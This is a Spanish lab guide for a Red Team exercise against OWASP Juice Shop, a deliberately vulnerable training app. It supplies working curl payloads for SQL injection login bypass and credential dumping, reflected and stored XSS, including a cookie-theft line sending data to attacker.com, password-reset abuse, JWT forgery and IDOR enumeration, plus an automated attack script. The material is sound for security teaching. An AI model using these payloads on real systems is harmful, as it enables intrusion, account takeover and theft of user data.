# Actividades Red Team - Explotación de Vulnerabilidades

## 🎯 Objetivo

Identificar, explotar y documentar vulnerabilidades en OWASP Juice Shop, generando evidencia completa de cada ataque para análisis posterior del Blue Team.

## 📋 Requisitos del Proyecto

### Vulnerabilidades Requeridas (Mínimo 4)

Debes explotar y documentar **al menos 4 vulnerabilidades** de las siguientes categorías:

1. ✅ **SQL Injection** (obligatorio - al menos 1 PoC)
2. ✅ **Cross-Site Scripting (XSS)** - almacenado y/o reflejado
3. ⚠️ **Inyección de Comandos / RCE** (si es posible)
4. ✅ **Autenticación rota / Bypass de login**
5. ✅ **Control de acceso mal configurado**

### Documentación Requerida por Vulnerabilidad

Para **cada vulnerabilidad** explotada, debes documentar:

1. **Descripción técnica**
   - ¿Qué es la vulnerabilidad?
   - ¿Cómo funciona el ataque?
   - ¿Por qué existe la vulnerabilidad?

2. **Pasos concretos para reproducir**
   - Comandos exactos (curl, scripts)
   - Headers HTTP necesarios
   - Payloads utilizados
   - Screenshots de BurpSuite/ZAP

3. **Impacto probable**
   - **Confidencialidad**: ¿Qué información se puede robar?
   - **Integridad**: ¿Qué datos se pueden modificar?
   - **Disponibilidad**: ¿Se puede causar DoS?

4. **Clasificación de seguridad**
   - **OWASP Top 10**: Categoría correspondiente
   - **CVSS v3.1**: Score calculado (usar calculadora oficial)
   - **Severidad**: Critical/High/Medium/Low

5. **Evidencia**
   - Logs capturados
   - Screenshots de BurpSuite/ZAP
   - Capturas de comandos curl
   - Respuestas del servidor

---

## 🚀 Preparación del Ambiente

### 1. Levantar Juice Shop

```bash
# Asegúrate de estar en la rama correcta
git checkout paso-1-juice-shop  # o la rama que uses

# Levantar el servicio
docker compose up -d

# Verificar que está corriendo
docker compose ps
curl http://localhost:3000
```

### 2. Herramientas Recomendadas

#### Opción 1: BurpSuite Community Edition
```bash
# Descargar de: https://portswigger.net/burp/communitydownload
# Configurar proxy en navegador: 127.0.0.1:8080
```

#### Opción 2: OWASP ZAP
```bash
# macOS
brew install --cask owasp-zap

# Linux
sudo apt install zaproxy

# Iniciar ZAP y configurar proxy
```

#### Opción 3: curl + jq (línea de comandos)
```bash
# Verificar instalación
curl --version
jq --version

# Si no están instalados:
# macOS: brew install curl jq
# Linux: sudo apt install curl jq
```

### 3. Crear Directorio de Trabajo

```bash
mkdir -p red-team-evidence
cd red-team-evidence

# Estructura sugerida
mkdir -p {sqli,xss,auth-bypass,access-control}/{screenshots,payloads,logs}
```

---

## 🎯 Vulnerabilidad 1: SQL Injection (OBLIGATORIO)

### Descripción Técnica

**SQL Injection** es una vulnerabilidad que permite a un atacante insertar código SQL malicioso en campos de entrada, manipulando las consultas a la base de datos.

**¿Por qué existe?**: La aplicación no valida ni sanitiza correctamente la entrada del usuario antes de incluirla en consultas SQL.

### Endpoints Vulnerables en Juice Shop

1. **Login** (`/rest/user/login`)
2. **Búsqueda de productos** (`/rest/products/search?q=`)
3. **Tracking de pedidos** (`/rest/track-order`)

### PoC 1: SQL Injection en Login

#### Paso 1: Identificar el endpoint vulnerable

```bash
# Endpoint de login
POST http://localhost:3000/rest/user/login
Content-Type: application/json

{
  "email": "test@test.com",
  "password": "test"
}
```

#### Paso 2: Probar payload básico

```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "'\'' OR 1=1--",
    "password": "anything"
  }' | jq .
```

**Explicación del payload**:
- `'`: Cierra la cadena del email
- `OR 1=1`: Condición siempre verdadera
- `--`: Comenta el resto de la query SQL

#### Paso 3: Bypass de autenticación (admin)

```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@juice-sh.op'\'' --",
    "password": "anything"
  }' | jq .
```

**Resultado esperado**:
```json
{
  "authentication": {
    "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

#### Paso 4: Extraer información de la base de datos

```bash
# Listar tablas (SQLite)
curl "http://localhost:3000/rest/products/search?q=apple')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--"
```

### PoC 2: SQL Injection en Búsqueda

```bash
# Payload básico
curl "http://localhost:3000/rest/products/search?q=apple')) OR 1=1--"

# Extraer usuarios
curl "http://localhost:3000/rest/products/search?q=apple')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
```

### Documentación Requerida

#### Screenshots a Capturar:
1. Request en BurpSuite/ZAP mostrando el payload
2. Response mostrando bypass exitoso
3. Token JWT obtenido
4. Datos extraídos de la base de datos

#### Clasificación:

**OWASP Top 10**: A03:2021 - Injection

**CVSS v3.1 Score**: 9.8 (Critical)
```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Justificación**:
- **AV:N** (Attack Vector: Network) - Explotable remotamente
- **AC:L** (Attack Complexity: Low) - Fácil de explotar
- **PR:N** (Privileges Required: None) - No requiere autenticación
- **UI:N** (User Interaction: None) - No requiere interacción
- **C:H** (Confidentiality: High) - Acceso a toda la BD
- **I:H** (Integrity: High) - Puede modificar datos
- **A:H** (Availability: High) - Puede causar DoS

**Impacto**:
- **Confidencialidad**: 🔴 CRÍTICO - Acceso a credenciales, datos de usuarios, información sensible
- **Integridad**: 🔴 CRÍTICO - Modificación de datos, creación de usuarios admin
- **Disponibilidad**: 🟡 MEDIO - Posible DoS con queries pesadas

---

## 🎯 Vulnerabilidad 2: Cross-Site Scripting (XSS)

### Descripción Técnica

**XSS** permite inyectar código JavaScript malicioso que se ejecuta en el navegador de otros usuarios.

**Tipos**:
- **Reflejado**: Payload en URL, se ejecuta inmediatamente
- **Almacenado**: Payload guardado en BD, se ejecuta cada vez que se carga
- **DOM-based**: Manipulación del DOM del lado del cliente

### PoC 1: XSS Reflejado en Búsqueda

#### Paso 1: Identificar campo vulnerable

```bash
# Probar payload básico
curl "http://localhost:3000/rest/products/search?q=<script>alert(1)</script>"
```

#### Paso 2: Bypass de filtros

```bash
# Si el básico no funciona, probar variaciones:

# Usando eventos HTML
curl "http://localhost:3000/rest/products/search?q=<img src=x onerror=alert(1)>"

# Usando SVG
curl "http://localhost:3000/rest/products/search?q=<svg/onload=alert(1)>"

# Usando iframe
curl "http://localhost:3000/rest/products/search?q=<iframe src=javascript:alert(1)>"
```

#### Paso 3: Payload avanzado (robo de cookies)

```bash
# Payload para enviar cookies a servidor atacante
curl "http://localhost:3000/rest/products/search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
```

### PoC 2: XSS Almacenado en Comentarios/Reviews

#### Paso 1: Crear cuenta y autenticarse

```bash
# Registrar usuario
curl -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@test.com",
    "password": "Hacker123!",
    "passwordRepeat": "Hacker123!",
    "securityQuestion": {
      "id": 1,
      "question": "Your eldest siblings middle name?",
      "answer": "test"
    }
  }'

# Login
TOKEN=$(curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@test.com","password":"Hacker123!"}' | jq -r '.authentication.token')
```

#### Paso 2: Inyectar XSS en review

```bash
# Crear review con XSS
curl -X POST http://localhost:3000/api/Feedbacks \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "comment": "<iframe src=\"javascript:alert(`XSS Stored`)\">",
    "rating": 5
  }'
```

#### Paso 3: Verificar ejecución

```bash
# Acceder a la página de feedbacks
# El XSS se ejecutará para cualquier usuario que vea los comentarios
curl http://localhost:3000/api/Feedbacks
```

### Documentación Requerida

#### Screenshots a Capturar:
1. Payload en BurpSuite/ZAP
2. Alert box ejecutándose en navegador
3. Código fuente mostrando el XSS inyectado
4. Console del navegador mostrando ejecución

#### Clasificación:

**OWASP Top 10**: A03:2021 - Injection (XSS)

**CVSS v3.1 Score**: 
- **XSS Reflejado**: 6.1 (Medium)
  ```
  Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  ```
- **XSS Almacenado**: 7.1 (High)
  ```
  Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L
  ```

**Impacto**:
- **Confidencialidad**: 🟡 MEDIO - Robo de cookies, sesiones
- **Integridad**: 🟡 MEDIO - Modificación del DOM, phishing
- **Disponibilidad**: 🟢 BAJO - Impacto mínimo

---

## 🎯 Vulnerabilidad 3: Autenticación Rota / Bypass de Login

### Descripción Técnica

Vulnerabilidades en el mecanismo de autenticación que permiten acceder sin credenciales válidas o con credenciales débiles.

### PoC 1: Password Reset Token Predictable

#### Paso 1: Solicitar reset de contraseña

```bash
# Solicitar reset para admin
curl -X POST http://localhost:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@juice-sh.op",
    "answer": "Daniel Boone",
    "new": "NewPassword123!",
    "repeat": "NewPassword123!"
  }'
```

**Nota**: La respuesta de seguridad del admin es conocida (Daniel Boone).

### PoC 2: JWT Token Manipulation

#### Paso 1: Obtener un token válido

```bash
# Login como usuario normal
TOKEN=$(curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123"}' | jq -r '.authentication.token')

echo $TOKEN
```

#### Paso 2: Decodificar JWT

```bash
# Instalar jwt-cli si no lo tienes
# npm install -g jwt-cli

# Decodificar token
jwt decode $TOKEN
```

**Output esperado**:
```json
{
  "status": "success",
  "data": {
    "email": "test@test.com",
    "id": 5,
    "role": "customer"
  }
}
```

#### Paso 3: Manipular token (si la clave es débil)

```bash
# Intentar firmar con clave débil conocida
# Juice Shop usa claves débiles en algunos casos
jwt encode --secret "secret" '{"email":"admin@juice-sh.op","id":1,"role":"admin"}'
```

### PoC 3: Enumeración de Usuarios

```bash
# Verificar si un email existe
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' | jq .

# Respuesta diferente indica que el usuario existe
```

### Documentación Requerida

#### Screenshots a Capturar:
1. Request de reset de contraseña
2. Token JWT decodificado
3. Acceso con credenciales modificadas
4. Panel de admin accedido sin autorización

#### Clasificación:

**OWASP Top 10**: A07:2021 - Identification and Authentication Failures

**CVSS v3.1 Score**: 8.1 (High)
```
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Impacto**:
- **Confidencialidad**: 🔴 ALTO - Acceso a cuentas de otros usuarios
- **Integridad**: 🔴 ALTO - Modificación de datos de usuarios
- **Disponibilidad**: 🟢 BAJO - Sin impacto directo

---

## 🎯 Vulnerabilidad 4: Control de Acceso Mal Configurado

### Descripción Técnica

Fallas en la verificación de permisos que permiten acceder a recursos o funciones sin la autorización adecuada.

### PoC 1: Acceso a Basket de Otros Usuarios

#### Paso 1: Crear dos usuarios

```bash
# Usuario 1
curl -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user1@test.com",
    "password": "User1Pass!",
    "passwordRepeat": "User1Pass!",
    "securityQuestion": {"id": 1, "answer": "test"}
  }'

# Usuario 2
curl -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user2@test.com",
    "password": "User2Pass!",
    "passwordRepeat": "User2Pass!",
    "securityQuestion": {"id": 1, "answer": "test"}
  }'
```

#### Paso 2: Login como usuario 1

```bash
TOKEN1=$(curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user1@test.com","password":"User1Pass!"}' | jq -r '.authentication.token')

# Obtener basket ID del usuario 1
BASKET1=$(curl http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN1" | jq -r '.data.id')

echo "Basket User 1: $BASKET1"
```

#### Paso 3: Login como usuario 2 e intentar acceder al basket del usuario 1

```bash
TOKEN2=$(curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user2@test.com","password":"User2Pass!"}' | jq -r '.authentication.token')

# Intentar acceder al basket del usuario 1 con token del usuario 2
curl http://localhost:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN2" | jq .
```

**Resultado**: Si la vulnerabilidad existe, el usuario 2 puede ver el carrito del usuario 1.

### PoC 2: IDOR en Perfil de Usuario

```bash
# Acceder a perfiles de otros usuarios iterando IDs
for i in {1..10}; do
  echo "=== User ID: $i ==="
  curl http://localhost:3000/api/Users/$i \
    -H "Authorization: Bearer $TOKEN2" | jq '.data | {id, email, role}'
done
```

### PoC 3: Acceso a Funciones de Admin

```bash
# Intentar acceder a endpoints de admin sin ser admin
curl http://localhost:3000/rest/user/authentication-details \
  -H "Authorization: Bearer $TOKEN2" | jq .

# Intentar acceder a logs de aplicación
curl http://localhost:3000/support/logs \
  -H "Authorization: Bearer $TOKEN2"
```

### Documentación Requerida

#### Screenshots a Capturar:
1. Request mostrando acceso a recurso de otro usuario
2. Response con datos sensibles
3. Comparación de permisos esperados vs obtenidos
4. Logs mostrando acceso no autorizado

#### Clasificación:

**OWASP Top 10**: A01:2021 - Broken Access Control

**CVSS v3.1 Score**: 7.5 (High)
```
Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

**Impacto**:
- **Confidencialidad**: 🔴 ALTO - Acceso a datos de otros usuarios
- **Integridad**: 🟡 MEDIO - Posible modificación de datos ajenos
- **Disponibilidad**: 🟢 BAJO - Sin impacto directo

---

## 📊 Generación de Tráfico para Blue Team

### Script de Ataques Automatizados

Crea un script que ejecute todos los ataques para que el Blue Team pueda detectarlos:

```bash
#!/bin/bash
# red-team-attacks.sh

echo "=== Iniciando ataques Red Team ==="
echo "Timestamp: $(date -u)"

# SQLi en login
echo "[1] SQL Injection en Login"
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' \
  -w "\nHTTP Status: %{http_code}\n"
sleep 2

# SQLi en búsqueda
echo "[2] SQL Injection en Búsqueda"
curl "http://localhost:3000/rest/products/search?q=apple')) OR 1=1--" \
  -w "\nHTTP Status: %{http_code}\n"
sleep 2

# XSS reflejado
echo "[3] XSS Reflejado"
curl "http://localhost:3000/rest/products/search?q=<script>alert(1)</script>" \
  -w "\nHTTP Status: %{http_code}\n"
sleep 2

# XSS con img tag
echo "[4] XSS con IMG"
curl "http://localhost:3000/rest/products/search?q=<img src=x onerror=alert(1)>" \
  -w "\nHTTP Status: %{http_code}\n"
sleep 2

# Scanning/Burst
echo "[5] Scanning de endpoints"
for i in {1..30}; do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    "http://localhost:3000/non-existent-endpoint-$i"
  sleep 0.5
done

echo "=== Ataques completados ==="
echo "Timestamp: $(date -u)"
```

Ejecutar:
```bash
chmod +x red-team-attacks.sh
./red-team-attacks.sh | tee attack-log-$(date +%Y%m%d-%H%M%S).txt
```

---

## 📝 Plantilla de Informe Red Team

### Estructura del Informe

```markdown
# Informe Red Team - Explotación de OWASP Juice Shop

## Información del Equipo
- **Integrantes**: [Nombres]
- **Fecha**: [Fecha]
- **Versión de Juice Shop**: [Versión]

## Resumen Ejecutivo

[Breve descripción de las vulnerabilidades encontradas y explotadas]

### Vulnerabilidades Identificadas

| # | Vulnerabilidad | Severidad | CVSS | OWASP Top 10 |
|---|----------------|-----------|------|--------------|
| 1 | SQL Injection | Critical | 9.8 | A03:2021 |
| 2 | XSS Almacenado | High | 7.1 | A03:2021 |
| 3 | Auth Bypass | High | 8.1 | A07:2021 |
| 4 | Broken Access Control | High | 7.5 | A01:2021 |

---

## Vulnerabilidad 1: SQL Injection

### Descripción Técnica
[Explicación detallada]

### Pasos para Reproducir
1. [Paso 1]
2. [Paso 2]
3. [Paso 3]

### Payload Utilizado
```bash
[Comando exacto]
```

### Screenshots
![SQLi Login](./screenshots/sqli-login.png)
![SQLi Response](./screenshots/sqli-response.png)

### Impacto
- **Confidencialidad**: [Descripción]
- **Integridad**: [Descripción]
- **Disponibilidad**: [Descripción]

### Clasificación
- **OWASP Top 10**: A03:2021 - Injection
- **CVSS v3.1**: 9.8 (Critical)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Logs Capturados
```
[Extracto de logs]
```

---

[Repetir para cada vulnerabilidad]

---

## Conclusiones

### Vulnerabilidades Críticas
[Lista y análisis]

### Recomendaciones de Remediación
1. [Recomendación 1]
2. [Recomendación 2]

### Lecciones Aprendidas
[Reflexión del equipo]

## Anexos

### A. Comandos Completos
[Lista de todos los comandos ejecutados]

### B. Configuración de Herramientas
[BurpSuite, ZAP, etc.]

### C. Scripts Utilizados
[Scripts de automatización]

### D. Referencias
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Juice Shop Documentation](https://pwning.owasp-juice.shop/)
```

---

## ✅ Checklist de Entrega

### Documentación
- [ ] Informe completo en formato PDF/Markdown
- [ ] Mínimo 4 vulnerabilidades documentadas
- [ ] Cada vulnerabilidad con PoC reproducible
- [ ] CVSS calculado para cada vulnerabilidad
- [ ] OWASP Top 10 clasificación

### Evidencia
- [ ] Screenshots de BurpSuite/ZAP (mínimo 3 por vulnerabilidad)
- [ ] Logs capturados de los ataques
- [ ] Comandos curl completos
- [ ] Respuestas del servidor

### Análisis
- [ ] Descripción técnica de cada vulnerabilidad
- [ ] Impacto detallado (CIA)
- [ ] Pasos de reproducción claros
- [ ] Recomendaciones de remediación

### Scripts
- [ ] Script de ataques automatizados
- [ ] Logs de ejecución
- [ ] Payloads organizados

---

## 🔗 Coordinación con Blue Team

### Información a Compartir

1. **Timing de ataques**: Coordinar horarios para que Blue Team pueda detectar
2. **Endpoints atacados**: Lista de URLs utilizadas
3. **Payloads**: Compartir para que puedan crear reglas
4. **IPs**: Informar desde qué IPs se atacó

### Reunión de Coordinación

Antes de empezar, reunirse con Blue Team para:
- Definir ventana de tiempo de ataques
- Acordar qué vulnerabilidades se explotarán
- Establecer límites (no causar DoS real)
- Definir formato de logs a generar

---

## 🆘 Troubleshooting

### Problema: Payload no funciona

```bash
# Verificar encoding
echo "' OR 1=1--" | xxd

# Probar diferentes encodings
curl "http://localhost:3000/rest/products/search?q=%27%20OR%201%3D1--"
```

### Problema: No se generan logs

```bash
# Verificar que Filebeat está corriendo
docker compose ps filebeat

# Ver logs de Filebeat
docker compose logs filebeat | tail -50
```

### Problema: Token JWT no válido

```bash
# Verificar formato del token
echo $TOKEN | jwt decode

# Renovar token
TOKEN=$(curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password"}' | jq -r '.authentication.token')
```

---

## 📚 Referencias

- [OWASP Juice Shop Official Guide](https://pwning.owasp-juice.shop/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [JWT.io Debugger](https://jwt.io/)

---

**¡Buena suerte con tus ataques!** 🎯🔴

**Recuerda**: Este es un entorno de laboratorio. **NUNCA** uses estas técnicas en sistemas reales sin autorización explícita. El hacking no autorizado es ilegal.
